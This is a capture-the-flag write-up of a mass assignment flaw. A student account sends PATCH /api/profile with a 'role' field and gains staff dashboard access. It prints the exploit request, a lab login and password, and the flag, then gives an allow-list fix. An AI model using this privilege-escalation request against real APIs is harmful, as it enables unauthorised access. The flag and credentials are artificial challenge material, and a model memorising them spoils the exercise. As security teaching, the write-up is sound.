# 04 — Mass assignment (`role`)

**Where:** `PATCH /api/profile` then `GET /staff/dashboard`
**Flag:** `FLAG{just_p4tch_y0ur_0wn_r0l3_lol}`

## What is wrong

I am logged in as a student. The `/staff` page says to try `PATCH /api/profile`. I send `{"role":"cadet"}`, the server then copies that field onto my user. I reload `/staff/dashboard`: "Cadet+ access granted" and the flag.

## Exploit

```sh
sh exploit.sh
```

The only interesting request is:

```http
PATCH /api/profile
Content-Type: application/json
Cookie: session=<benjamin>

{"role":"cadet"}
```

Login is `benjamin@student.42.tech` / `NewDarkly123!`, the password set in breach 02. No Burp is required: `curl` sends the same request.

## Impact

Any student can become staff and read the staff dashboard.

## Fix

Bind only an allow-list of fields (`first_name`, `last_name`, `campus`). Ignore `role` and anything else. Change a role in a separate admin function that checks the caller is already an admin.
